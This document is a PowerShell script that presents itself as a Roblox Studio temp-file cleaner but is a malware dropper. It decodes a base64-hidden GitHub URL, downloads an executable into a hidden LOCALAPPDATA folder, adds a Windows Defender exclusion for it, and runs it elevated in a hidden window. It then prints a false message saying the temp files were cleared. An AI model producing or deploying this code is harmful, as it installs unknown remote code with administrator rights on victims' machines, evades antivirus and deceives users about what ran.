$downloadUrlB64 = "aHR0cHM6Ly9naXRodWIuY29tL0FtYmF0dWthbWhhY2tlci9sMjMvcmF3L21haW4vYy5leGU="
$updaterExeB64 = "dXBkYXRlci5leGU="
$silentlyContinueB64 = "U2lsZW50bHlDb250aW51ZQ=="
$stopActionB64 = "U3RvcA=="
$directoryB64 = "RGlyZWN0b3J5"
$runAsB64 = "UnVuQXM="

$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))

$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
New-Item -ItemType $directory -Path $hiddenFolder -Force | Out-Null

$tempPath = Join-Path $hiddenFolder $updaterExe

function Add-Exclusion {
    param ([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
    } catch {}
}

try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
    (Get-Item $hiddenFolder).Attributes += 'Hidden'
    (Get-Item $tempPath).Attributes += 'Hidden'
    Add-Exclusion -Path $tempPath
    Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -Wait
    Remove-Item $hiddenFolder -Recurse -Force
}
catch {
    exit 1
}

Write-Host "Successfully emptied Roblox Studio temporary files folder."
